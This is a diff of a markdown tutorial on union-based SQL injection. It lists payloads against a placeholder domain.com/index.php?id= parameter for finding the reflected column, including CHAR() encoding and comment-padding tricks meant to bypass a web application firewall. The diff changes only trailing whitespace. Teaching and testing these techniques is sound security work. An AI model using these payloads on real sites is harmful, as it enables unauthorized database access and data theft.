@@ -104,9 +104,9 @@ This means there are only 4 columns. Now we have to find which one of these 4 co
 
 Using a simple query, we determine which of the 4 columns reflect our input using. Only 1 of these payloads will run without **syntax error**. *NOTE: If none worked, try the same payloads, but remove the quote (') after number 1.*    
 
-```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```
+```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```  
 ```http://domain.com/index.php?id=-1 Union Select 1,2,3,4-- -```  
-```http://domain.com/index.php?id=-1' Union Select 1,2,3,4-- -```
+```http://domain.com/index.php?id=-1' Union Select 1,2,3,4-- -```  
 ```http://domain.com/index.php?id=1'+UNION+ALL+SELECT+null,null,null,null--+-```  
 ```http://domain.com/index.php?id=1' Union Select null,2,3,4-- -```  
 ```http://domain.com/index.php?id=1' Union Select 1,null,3,4-- -```  
@@ -133,7 +133,7 @@ Website must successfully load and we will see a number (in our case between 1-4
 ```http://domain.com/index.php?id=1+UNION+ALL+SELECT+1%2c2%2c3%2c4--+-```  
 ```http://domain.com/index.php?id=1 Union Select CHAR(49),CHAR(50),CHAR(51),CHAR(52)-- -```  
 ```http://domain.com/index.php?id=1 %23%0AUnion%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0ASelect%23%0A1,2,3,4-- -``` (buffer by a * 300)  
- ```http://domain.com/index.php?id=Union Select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d-- -```
+ ```http://domain.com/index.php?id=Union Select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d-- -```  
 
     - If the queries still doesn't show the vulnerable column number, it is probably the WAF blocking our queries. Let's try injection payloads which bypass it.   
     
